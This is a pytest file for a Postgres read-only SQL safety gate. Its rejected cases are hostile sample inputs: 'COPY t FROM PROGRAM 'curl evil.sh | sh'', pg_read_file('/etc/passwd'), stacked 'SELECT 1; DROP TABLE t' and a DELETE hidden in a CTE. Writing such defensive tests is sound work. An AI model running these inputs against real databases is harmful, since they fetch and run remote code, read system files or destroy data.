import pytest

from pgllens.database.safety import UnsafeQueryError, assert_read_only


def ok(sql):
    assert assert_read_only(sql) == sql


def bad(sql):
    with pytest.raises(UnsafeQueryError):
        assert_read_only(sql)


# --- allowed shapes ---
def test_plain_select():
    ok("SELECT 1")


def test_cte_select():
    ok("WITH x AS (SELECT 1 AS a) SELECT * FROM x")


def test_table_and_values_forms():
    ok("TABLE item_master")
    ok("VALUES (1), (2)")


def test_trailing_semicolon_allowed():
    ok("SELECT 1;")


def test_write_word_inside_a_string_literal_is_data():
    ok("SELECT * FROM t WHERE note = 'please DELETE this row'")


def test_write_word_inside_a_quoted_identifier_is_data():
    ok('SELECT "drop" FROM t')


def test_column_named_like_a_keyword_prefix_is_fine():
    ok("SELECT created_at, updated_at, deleted_at FROM t")


def test_nested_block_comment_is_stripped():
    # Postgres nests /* */, unlike SQL Server. A non-nesting stripper would
    # leave "DELETE FROM t" exposed after the first */ and reject valid SQL --
    # or worse, a nesting payload could hide a write from a naive stripper.
    ok("SELECT 1 /* outer /* inner */ still comment */")


def test_dollar_quoted_body_is_data():
    ok("SELECT $$ DROP TABLE t $$ AS s")


def test_tagged_dollar_quoted_body_is_data():
    ok("SELECT $tag$ DELETE FROM t $tag$ AS s")


def test_escape_string_with_escaped_quote():
    ok(r"SELECT * FROM t WHERE s = E'it\'s fine, DROP nothing'")


def test_case_when_end_is_ok():
    ok("SELECT CASE WHEN a > 1 THEN 1 ELSE 2 END FROM t")


def test_leading_line_comment_then_select_is_ok():
    ok("-- note\nSELECT 1")


def test_bare_parameter_placeholder_is_ok():
    ok("SELECT * FROM t WHERE id = $1")


def test_current_setting_read_is_ok():
    # current_setting is a read; only the mutating set_config is blocked.
    ok("SELECT current_setting('statement_timeout')")


# --- rejected: DML/DDL ---
@pytest.mark.parametrize("sql", [
    "INSERT INTO t VALUES (1)",
    "UPDATE t SET a = 1",
    "DELETE FROM t",
    "DROP TABLE t",
    "CREATE TABLE t (a int)",
    "ALTER TABLE t ADD COLUMN b int",
    "TRUNCATE t",
    "GRANT SELECT ON t TO r",
    "REFRESH MATERIALIZED VIEW mv",
    "REINDEX INDEX i",
    "CLUSTER t",
    "VACUUM FULL",
])
def test_dml_ddl_rejected(sql):
    bad(sql)


def test_write_hidden_in_a_cte_is_rejected():
    # The leading keyword is WITH and the statement "starts with" a read --
    # this is why the blocklist, not the first word, is the real gate.
    bad("WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d")


def test_second_statement_after_semicolon_rejected():
    bad("SELECT 1; DROP TABLE t")


def test_second_statement_with_no_separator_rejected():
    bad("SELECT 1 DROP TABLE t")


def test_bare_end_rejected():
    bad("END")


def test_double_trailing_semicolon_rejected():
    bad("SELECT 1;;")


# --- rejected: Postgres-specific escape hatches ---
@pytest.mark.parametrize("sql", [
    "COPY t FROM PROGRAM 'curl evil.sh | sh'",
    "COPY (SELECT 1) TO '/tmp/x'",
    "DO $$ BEGIN PERFORM 1; END $$",
    "CALL some_procedure()",
    "SET ROLE postgres",
    "RESET ALL",
    "BEGIN",
    "COMMIT",
    "LISTEN chan",
    "NOTIFY chan",
    "DISCARD ALL",
    "PREPARE p AS SELECT 1",
    "EXECUTE p",
    "LOCK TABLE t",
    "SECURITY LABEL ON TABLE t IS 'x'",
])
def test_postgres_escape_hatches_rejected(sql):
    bad(sql)


@pytest.mark.parametrize("sql", [
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_ls_dir('/')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1, '/tmp/x')",
    "SELECT dblink('...', 'DELETE FROM t')",
    "SELECT pg_terminate_backend(1)",
    "SELECT pg_cancel_backend(1)",
    "SELECT setval('s', 1)",
    "SELECT nextval('s')",
    "SELECT pg_sleep(3600)",
    "SELECT set_config('statement_timeout', '0', false)",
    "SELECT set_config('transaction_read_only', 'off', true)",
])
def test_dangerous_functions_rejected(sql):
    bad(sql)


@pytest.mark.parametrize("sql", [
    "SELECT pg_try_advisory_lock(42)",
    "SELECT pg_try_advisory_lock_shared(1, 2)",
    "SELECT pg_advisory_xact_lock(42)",
    "SELECT pg_try_advisory_xact_lock(42)",
    "SELECT pg_advisory_xact_lock_shared(1, 2)",
    "SELECT pg_advisory_unlock(42)",
    "SELECT pg_advisory_unlock_all()",
])
def test_advisory_lock_variants_are_blocked(sql):
    bad(sql)


def test_identifiers_containing_advisory_are_not_blocked():
    # A column merely *named* like the function must not trip the gate.
    ok("SELECT pg_advisory_lock_count FROM stats")


# --- rejected: ambiguous input ---
def test_unterminated_string_rejected():
    bad("SELECT 'abc")


def test_unterminated_block_comment_rejected():
    bad("SELECT 1 /* never closed")


def test_unterminated_dollar_quote_rejected():
    bad("SELECT $$ abc")


def test_empty_query_rejected():
    bad("   ")
